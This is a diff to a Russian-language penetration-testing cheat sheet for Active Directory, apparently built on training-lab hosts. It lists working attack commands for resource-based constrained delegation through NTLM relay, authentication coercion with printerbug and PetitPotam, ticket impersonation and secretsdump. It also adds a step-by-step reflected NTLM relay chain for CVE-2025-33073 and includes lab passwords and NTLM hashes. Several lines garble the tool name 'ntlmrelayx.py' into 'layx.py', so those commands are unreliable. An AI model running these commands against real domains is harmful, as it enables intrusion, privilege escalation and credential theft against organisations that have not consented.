@@ -918,14 +918,14 @@
 		wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
   		или dcsync
 
-  * (RBCD from LINUX через ntlmrelay) по умолчанию компьютер может редактировать свои собственные msDS-AllowedToActOnBehalfOfOtherIdentityатрибут!!!
+  * (RBCD from LINUX через lay) по умолчанию компьютер может редактировать свои собственные msDS-AllowedToActOnBehalfOfOtherIdentityатрибут!!!
  
-    		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$' (добавляем компутер в домен)
-    		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug (повышение привелегий)
+    		sudo layx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$' (добавляем компутер в домен)
+    		sudo layx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug (повышение привелегий)
     		crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret (включаем webdaw)
     		crackmapexec smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav (проверяем где включился)
     		sudo python3 Responder.py -I ens192 (для коонтроля smb and http = off)
-    		sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump   (добавляем RBCD на SQL01$)
+    		sudo layx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump   (добавляем RBCD на SQL01$)
     		python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 LINUX01@80/print (вызывае аутентификацию -- LINUX01@80/print -то что ловится Responderom)
 		findDelegation.py INLANEFREIGHT.LOCAL/administrator -hashes aad3b435b51404eeaad3b435b51404ee:d1e532fdcdea711011a6b13bcf390401  (проверяем сработало ли)
     		getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"xw{4tWh4sT^+q-$"  (заказываем TGS)
@@ -968,6 +968,26 @@
 		secretsdump.py -k -no-pass -dc-ip '10.129.205.35' @'dc01.inlanefreight.local'
     		
 # NTLMRELAY ATTACK
+	
+# (CVE-2025-33073) reflected-ntlm-relay
+	nxc smb 192.168.0.100 -u 'max' -p 'P@ssword123' -M ntlm_reflection
+	1. Проверьте статус подписи SMB и уязвимости, связанные с принуждением: подпись smb должна быть отключена
+	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus
+	2. Запустите SMB Relay Listener
+	impacket-ntlmrelayx -t <target-ip> -smb2support
+	3. Зарегистрируйте DNS-запись
+	Мы создаем специальную DNS-запись, чтобы обмануть Windows и заставить ее думать, что она взаимодействует сама с собой:
+	python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -a add -d <my-ip> <dc-ip> (-dns-ip <dc-ip>)
+	4. Принудительное выполнение команд на рабочей станции с помощью NetExec или PetitPotam
+	Теперь мы используем NetExec or PetitPotam для принудительного выполнения на хосте-жертве исходящей аутентификации NTLM с использованием нашего поддельного DNS-имени:
+	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+	5. Сброс SAM после аутентификации SYSTEM
+	После успешного принудительного применения (аутентификации) мы извлекаем токен SYSTEM и сбрасываем SAM
+	в окне
+	impacket-ntlmrelayx -t <target-ip> -smb2support
+
+	
+	
 	Запускаем респондер и убираем в нем smb = off and http = off
 	
  	python3 Responder.py -I ens192
